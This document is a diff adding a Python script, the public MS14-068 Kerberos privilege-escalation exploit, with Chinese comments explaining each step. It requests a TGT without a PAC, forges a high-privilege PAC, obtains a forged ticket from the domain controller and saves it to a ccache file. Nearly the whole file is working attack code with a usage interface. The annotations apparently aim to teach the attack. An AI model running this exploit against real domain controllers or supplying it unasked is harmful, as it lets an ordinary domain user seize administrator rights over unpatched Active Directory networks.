@@ -1,0 +1,237 @@
+
+
+
+
+exp：
+#!/usr/bin/python
+#coding=utf-8
+# Sylvain Monne
+
+# MS14-068 Exploit
+
+# Author
+# ------
+# Sylvain Monne
+# Contact : sylvain dot monne at solucom dot fr
+# http://twitter.com/bidord
+
+
+
+import sys, os
+from random import getrandbits
+from time import time, localtime, strftime
+
+from kek.ccache import CCache, get_tgt_cred, kdc_rep2ccache
+from kek.crypto import generate_subkey, ntlm_hash, RC4_HMAC, HMAC_MD5
+from kek.krb5 import build_as_req, build_tgs_req, send_req, recv_rep, \
+    decrypt_as_rep, decrypt_tgs_rep, decrypt_ticket_enc_part, iter_authorization_data, \
+    AD_WIN2K_PAC
+from kek.pac import build_pac, pretty_print_pac
+from kek.util import epoch2gt, gt2epoch
+
+
+def sploit(user_realm, user_name, user_sid, user_key, kdc_a, kdc_b, target_realm, target_service, target_host,
+           output_filename, krbtgt_a_key=None, trust_ab_key=None, target_key=None):
+
+    sys.stderr.write('  [+] Building AS-REQ for %s...' % kdc_a)
+    sys.stderr.flush()
+    nonce = getrandbits(31)
+    current_time = time()
+
+    # 密码对应的user-key 对信息加密 发送给AS  使用key生成对应的时间戳  第一次与AS交互设置pac_request为FALSE
+    # 故得到不包含PAC的TGT 方便伪造
+    as_req = build_as_req(user_realm, user_name, user_key, current_time, nonce, pac_request=False)
+    sys.stderr.write(' Done!\n')
+    
+    sys.stderr.write('  [+] Sending AS-REQ to %s...' % kdc_a)
+    sys.stderr.flush()
+    #正常发往AS
+    sock = send_req(as_req, kdc_a)
+    sys.stderr.write(' Done!\n')
+
+    sys.stderr.write('  [+] Receiving AS-REP from %s...' % kdc_a)
+    sys.stderr.flush()
+    #正常接收到AS的数据
+    data = recv_rep(sock)
+    sys.stderr.write(' Done!\n')
+
+    sys.stderr.write('  [+] Parsing AS-REP from %s...' % kdc_a)
+    sys.stderr.flush()
+
+    #使用user-key对接收的AS的data解密  得到与TGS交互的session key和不能解密的TGT  和认证时间
+    as_rep, as_rep_enc = decrypt_as_rep(data, user_key)
+    #得到session_key
+    session_key = (int(as_rep_enc['key']['keytype']), str(as_rep_enc['key']['keyvalue']))
+    logon_time = gt2epoch(str(as_rep_enc['authtime']))
+
+    #得到tgt_a(正常的)
+    tgt_a = as_rep['ticket']
+    sys.stderr.write(' Done!\n')
+
+
+    if krbtgt_a_key is not None:
+        print >> sys.sdterr, as_rep.prettyPrint()
+        print >> sys.stderr, as_rep_enc.prettyPrint()
+        ticket_debug(tgt_a, krbtgt_a_key)
+    
+    sys.stderr.write('  [+] Building TGS-REQ for %s...' % kdc_a)
+    sys.stderr.flush()
+
+    #自定义的subkey为16位随机数
+    subkey = generate_subkey()
+
+    #几乎随机生成、不同的
+    nonce = getrandbits(31)
+    current_time = time()
+
+    #构造PAC  自定义了一个key(一般没使用)，在尾部使用自定义的md5算法对数据进行校验 传递过去checksum(md5值)  PAC已经伪造为高权限的PAC
+    pac = (AD_WIN2K_PAC, build_pac(user_realm, user_name, user_sid, logon_time))
+
+
+    #准备与TGS交互
+    #自定义的subkey被放到authorization中传递给到了服务器端   auth['subkey']['keyvalue'] = subkey[1]
+    #自定义的校验算法md5()也被传递过去
+    #TGS端使用TGS's session key对其解密即可得到subkey明文   
+    #客户端使用subkey对PAC加密，PAC被放在body中而非TGT中。  传递给到TGS端   再次设置pac_request为False
+    tgs_req = build_tgs_req(user_realm, 'krbtgt', target_realm, user_realm, user_name,
+                            tgt_a, session_key, subkey, nonce, current_time, pac, pac_request=False)
+    sys.stderr.write(' Done!\n')
+
+
+    #故最终：TGS使用TGS's session key对其解密得到相应数据。  
+    #TGS端先使用subkey对PAC密文解密，再使用传递过去的md5算法对其进行校验。 PAC明文也在其中。
+    #TGS端使用Server_key和KDC_key对其生成一个带key的签名，再用subkey对其加密，进而组合成为一个subkey加密后的新的TGT，将其返回。
+    sys.stderr.write('  [+] Sending TGS-REQ to %s...' % kdc_a)
+    sys.stderr.flush()
+    sock = send_req(tgs_req, kdc_a)
+    sys.stderr.write(' Done!\n')
+
+    sys.stderr.write('  [+] Receiving TGS-REP from %s...' % kdc_a)
+    sys.stderr.flush()
+
+    #接收到TGS的数据， 本应为SS's ticket 结果却还是TGT
+    data = recv_rep(sock)
+    sys.stderr.write(' Done!\n')
+
+    sys.stderr.write('  [+] Parsing TGS-REP from %s...' % kdc_a)
+
+    #使用自定义的传过去的subkey对其解密
+    tgs_rep, tgs_rep_enc = decrypt_tgs_rep(data, subkey)
+    session_key2 = (int(tgs_rep_enc['key']['keytype']), str(tgs_rep_enc['key']['keyvalue']))
+
+    #此时得到真正的伪造的高权限TGT
+    tgt_b = tgs_rep['ticket']
+    sys.stderr.write(' Done!\n')
+
+
+    if trust_ab_key is not None:
+        pretty_print_pac(pac[1])
+        print >> sys.stderr, tgs_rep.prettyPrint()
+        print >> sys.stderr, tgs_rep_enc.prettyPrint()
+        ticket_debug(tgt_b, trust_ab_key)
+
+
+    if target_service is not None and target_host is not None and kdc_b is not None:
+        sys.stderr.write('  [+] Building TGS-REQ for %s...' % kdc_b)
+        sys.stderr.flush()
+        subkey = generate_subkey()
+        nonce = getrandbits(31)
+        current_time = time()
+        tgs_req2 = build_tgs_req(target_realm, target_service, target_host, user_realm, user_name,
+                                tgt_b, session_key2, subkey, nonce, current_time)
+        sys.stderr.write(' Done!\n')
+
+        sys.stderr.write('  [+] Sending TGS-REQ to %s...' % kdc_b)
+        sys.stderr.flush()
+        sock = send_req(tgs_req2, kdc_b)
+        sys.stderr.write(' Done!\n')
+
+        sys.stderr.write('  [+] Receiving TGS-REP from %s...' % kdc_b)
+        sys.stderr.flush()
+        data = recv_rep(sock)
+        sys.stderr.write(' Done!\n')
+
+        sys.stderr.write('  [+] Parsing TGS-REP from %s...' % kdc_b)
+        tgs_rep2, tgs_rep_enc2 = decrypt_tgs_rep(data, subkey)
+        sys.stderr.write(' Done!\n')
+
+    else:
+        tgs_rep2 = tgs_rep
+        tgs_rep_enc2 = tgs_rep_enc
+
+    sys.stderr.write('  [+] Creating ccache file %r...' % output_filename)
+    cc = CCache((user_realm, user_name))
+    tgs_cred = kdc_rep2ccache(tgs_rep2, tgs_rep_enc2)
+    cc.add_credential(tgs_cred)
+    cc.save(output_filename)
+    sys.stderr.write(' Done!\n')
+
+
+    if target_key is not None:
+        print >> sys.stderr, tgs_rep2.prettyPrint()
+        print >> sys.stderr, tgs_rep_enc2.prettyPrint()
+        ticket_debug(tgs_rep2['ticket'], target_key)
+
+
+# Pretty print full ticket content
+# Only possible in a lab environment when you already know krbtgt and/or service keys
+def ticket_debug(ticket, key):
+    try:
+        ticket_enc = decrypt_ticket_enc_part(ticket, key)
+        print >> sys.stderr, ticket.prettyPrint()
+        for ad in iter_authorization_data(ticket_enc['authorization-data']):
+            print >> sys.stderr, 'AUTHORIZATION-DATA (type: %d):' % ad['ad-type']
+            if ad['ad-type'] == AD_WIN2K_PAC:
+                pretty_print_pac(str(ad['ad-data']))
+            else:
+                print >> sys.stderr, str(ad['ad-data']).encode('hex')
+    except Exception as e:
+        print 'ERROR:', e
+
+
+if __name__ == '__main__':
+    from getopt import getopt
+    from getpass import getpass
+
+    def usage_and_exit():
+        print >> sys.stderr, 'USAGE:'
+        print >> sys.stderr, '%s -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr>' % sys.argv[0]
+        print >> sys.stderr, ''
+        print >> sys.stderr, 'OPTIONS:'
+        print >> sys.stderr, '    -p <clearPassword>'
+        print >> sys.stderr, ' --rc4 <ntlmHash>'
+        sys.exit(1)
+
+    opts, args = getopt(sys.argv[1:], 'u:s:d:p:', ['rc4='])
+    opts = dict(opts)
+    if not all(k in opts for k in ('-u', '-s', '-d')):
+        usage_and_exit()
+
+    ##user_name为用户名  user_realm为域名 user_sid   kdc_a为域控名
+    user_name, user_realm = opts['-u'].split('@', 1)
+    user_sid = opts['-s']
+    kdc_a = opts['-d']
+
+    if '--rc4' in opts:
+        #RC4_HMAC=23        引入包里的定义而已
+        user_key = (RC4_HMAC, opts['--rc4'].decode('hex'))
+        #16位自定义key
+        assert len(user_key[1]) == 16
+    elif '-p' in opts:
+        #ntlm-hash 16位  密码对应的user-key
+        user_key = (RC4_HMAC, ntlm_hash(opts['-p']).digest())
+    else:
+        user_key = (RC4_HMAC, ntlm_hash(getpass('Password: ')).digest())
+
+    target_realm = user_realm
+    target_service = target_host = kdc_b = None
+    filename = 'TGT_%s@%s.ccache' % (user_name, user_realm)
+
+    user_realm = user_realm.upper()
+    target_realm = target_realm.upper()
+
+    sploit(user_realm, user_name, user_sid, user_key, kdc_a, kdc_b, target_realm, target_service, target_host, filename)
+
+
+
+
